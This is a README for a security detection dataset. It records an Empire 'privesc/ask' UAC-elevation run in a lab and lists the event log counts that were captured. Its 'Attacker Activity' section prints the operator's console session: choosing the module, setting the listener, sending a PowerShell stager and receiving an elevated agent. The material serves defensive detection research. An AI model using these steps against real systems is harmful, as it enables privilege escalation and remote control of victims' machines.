# Empire Ask

Leverages Start-Process' -Verb runAs option inside a YES-Required loop to prompt the user for a high integrity context before running the agent code.
UAC will report Powershell is requesting Administrator privileges. Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts.

## Technique(s) ID

T1088

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_ask.tar.gz](./empire_ask.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18183600

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             214 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |              14 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |              82 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              79 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              48 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security System Extension                              |               2 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             475 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             455 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             237 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              75 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              27 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              22 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             192 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: H3DKB8SA) > usemodule privesc/ask
(Empire: powershell/privesc/ask) > info

              Name: Invoke-Ask
            Module: powershell/privesc/ask
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  Jack64

Description:
  Leverages Start-Process' -Verb runAs option inside a YES-
  Required loop to prompt the user for a high integrity
  context before running the agent code. UAC will report
  Powershell is requesting Administrator privileges. Because
  this does not use the BypassUAC DLLs, it should not trigger
  any AV alerts.

Comments:
  https://github.com/rapid7/metasploit-
  framework/blob/master/modules/exploits/windows/local/ask.rb

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  Listener   True                                  Listener to use.                        
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  Agent      True        H3DKB8SA                  Agent to run module on.                 
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      

(Empire: powershell/privesc/ask) > set Listener https
(Empire: powershell/privesc/ask) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked H3DKB8SA to run TASK_CMD_JOB
[*] Agent H3DKB8SA tasked with task ID 2
[*] Tasked agent H3DKB8SA to run module powershell/privesc/ask
(Empire: powershell/privesc/ask) > Job started: PDY4F2
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent TKV35P8X checked in
[+] Initial agent TKV35P8X from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to TKV35P8X at 10.0.10.103
[*] Successfully elevated!


(Empire: powershell/privesc/ask) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 18:37:11  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 18:37:10  https           

(Empire: agents) >
```
